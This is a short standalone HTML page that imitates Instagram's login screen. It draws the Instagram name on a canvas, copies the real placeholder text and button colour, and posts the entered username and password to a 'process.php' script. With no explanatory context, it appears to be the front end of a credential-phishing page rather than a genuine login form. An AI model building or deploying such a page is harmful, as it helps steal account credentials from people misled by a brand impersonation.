<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Canvas Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        canvas {
            border: 1px solid #ccc;
        }
        form {
            position: absolute;
            top: 180px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        input {
            margin: 10px 0;
            padding: 10px;
            width: 80%;
            max-width: 300px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px;
            width: 80%;
            max-width: 300px;
            background-color: #3897f0;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #2874c7;
        }
    </style>
</head>
<body>
    <canvas id="loginCanvas" width="400" height="600"></canvas>
    <form action="process.php" method="POST">
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    <script>
        // Draw the Instagram logo on the canvas
        const canvas = document.getElementById('loginCanvas');
        const ctx = canvas.getContext('2d');

        // Background
        ctx.fillStyle = 'white';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // Instagram Logo
        ctx.font = '30px Arial';
        ctx.fillStyle = 'black';
        ctx.textAlign = 'center';
        ctx.fillText('Instagram', canvas.width / 2, 100);

        // Divider
        ctx.fillStyle = '#ccc';
        ctx.fillRect(50, 150, canvas.width - 100, 2);
    </script>

</body></html>
